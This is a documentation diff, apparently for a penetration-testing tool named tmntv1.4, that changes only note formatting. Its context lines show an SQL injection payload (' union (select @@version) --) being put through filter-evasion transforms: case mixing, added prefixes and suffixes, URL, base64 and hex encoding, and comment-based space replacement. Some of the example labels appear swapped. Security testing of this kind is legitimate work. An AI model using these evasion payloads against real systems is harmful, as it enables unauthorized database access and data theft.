@@ -48,7 +48,7 @@ Input payload:
 
 Output payload: ' union (select @@version) --
 
-Note: The tmntv1.4 tool will take as an input a file. 
+*Note*: The tmntv1.4 tool will take as an input a file. 
 
 This function adds case variation:
 
@@ -100,7 +100,7 @@ Input payload: ' union (select @@version) --
 
 Output payload: ' UnIoN (SeLeCt @@version) --
 
-Note: The tmntv1.4 tool will take as an input a file. 
+*Note*: The tmntv1.4 tool will take as an input a file. 
 
 This function adds suffixes e.g. %00 etc :
 
@@ -132,7 +132,7 @@ Input payload: ' union (select @@version) --
 
 Output payload: );' union (select @@version) --
 
-Note: The tmntv1.4 tool will take as an input a file.Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  
+*Note*: The tmntv1.4 tool will take as an input a file.Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  
 
 This function adds postfixes e.g. ); -- etc :
 
@@ -164,7 +164,7 @@ Input payload: ' union (select @@version) --
 
 Output payload:  ' union (select @@version) --%00
 
-Note: The tmntv1.4 tool will take as an input a file. Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  
+*Note*: The tmntv1.4 tool will take as an input a file. Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  
 
 This function does url encoding:
 
@@ -190,7 +190,7 @@ Input payload: ' union (select @@version) --
 
 Output payload: %27+union+%28select+%40%40version%29+--
 
-Note: The tmntv1.4 tool will take as an input a file. 
+*Note*: The tmntv1.4 tool will take as an input a file. 
 
 This function base 64 encoding:
 
@@ -216,7 +216,7 @@ Input payload: ' union (select @@version) --
 
 Output payload: JyB1bmlvbiAoc2VsZWN0IEBAdmVyc2lvbikgLS0=
 
-Note: The tmntv1.4 tool will take as an input a file. 
+*Note*: The tmntv1.4 tool will take as an input a file. 
 
 This function does hexadecimal encoding:
 
@@ -274,4 +274,4 @@ Input payload: ' union (select @@version) --
 
 Output payload: '/SQL COMMENT/union/SQL COMMENT/(select/SQL COMMENT/@@version)/**/--
 
-Note: The tmntv1.4 tool will take as an input a file. Also the replacer will read through the Filler File and add all listed space fillers. 
+*Note*: The tmntv1.4 tool will take as an input a file. Also the replacer will read through the Filler File and add all listed space fillers. 
